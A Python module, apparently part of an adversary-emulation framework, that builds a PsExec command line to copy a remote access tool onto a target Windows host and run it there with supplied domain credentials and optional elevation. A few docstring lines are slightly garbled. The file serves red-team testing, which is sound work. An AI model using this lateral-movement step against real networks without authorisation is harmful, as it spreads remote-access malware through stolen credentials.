from plugins.adversary.app.commands.command import CommandLine
from typing import Callable, Tuple
from plugins.adversary.app.commands import parsers


def copy(ps_file_path: str, rat_file_path: str, user_domain: str, username: str, password: str, target: str,
         elevated: bool = True) -> Tuple[CommandLine, Callable[[str], None]]:
    """Builds a commandline for PsExec to copy and execute a file remotely

    Args:
        ps_file_path: The path to the psexec binary
        rat_file_path: The path to the ratremote computer
        username: The username remote share
        user_domain: The (Windows) domain of the user account
        password: (Optional) The password to be used
        target: The target host to run the file on
        elevated: Allows the created process to be run in an elevated context
    Returns:
        The CommandLine and a parser
    """
    args = [ps_file_path, "-accepteula",
            "-u", user_domain + "\\" + username,
            "-p", password,
            "-h" if elevated else '',
            "-d", "-cv",
            rat_file_path, "\\\\" + target]

    return CommandLine(args), parsers.psexec.copy
